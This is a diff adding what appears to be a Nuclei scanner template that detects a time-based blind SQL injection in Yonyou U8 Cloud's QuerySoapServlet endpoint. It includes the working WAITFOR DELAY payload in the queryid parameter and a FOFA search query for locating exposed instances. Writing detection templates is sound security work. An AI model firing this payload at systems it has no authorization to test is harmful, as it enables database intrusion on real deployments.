@@ -1,0 +1,27 @@
+id: yonyou-u8cloud-soap-sqli
+
+info:
+  name: 用友U8 Cloud soap.QuerySoapServlet SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    用友U8 Cloud的QuerySoapServlet接口存在时间盲注漏洞，可通过queryid参数执行SQL命令
+    [漏洞发现时间：2025年7月]
+  metadata:
+    fofa-query: 'title="用友U8 Cloud" || body="/u8cloud/"'
+  tags: yonyou,u8cloud,sqli
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/service/~uapqe/nc.bs.pub.querymodel.soap.QuerySoapServlet?queryid=1'%3BWAITFOR+DELAY+'0%3A0%3A3'--"
+    headers:
+      Accept: text/xml
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=3 && duration<8"
+      - type: status
+        status:
+          - 500
